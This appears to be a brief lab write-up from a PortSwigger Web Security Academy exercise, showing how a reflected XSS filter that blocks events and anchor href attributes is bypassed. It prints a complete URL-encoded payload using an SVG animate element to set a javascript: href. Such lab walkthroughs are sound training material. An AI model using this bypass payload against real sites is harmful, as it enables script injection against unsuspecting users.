- Consider a shopping application that contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked.

![image](https://github.com/Akhilkj123/Portswigger/assets/65653010/3b1b94f9-30db-4dd0-808a-09805141bd3a)

- For solving this lab, we perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function. So we inject a URL ' https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E'> We replace the YOUR_LAB_ID with our lab ID.

![image](https://github.com/Akhilkj123/Portswigger/assets/65653010/7dad1872-f548-4009-bc50-7dc9c682a9cd)

- So the lab gets solved.

![image](https://github.com/Akhilkj123/Portswigger/assets/65653010/54e50dc0-1b43-4ec7-9045-930b567c60cc)



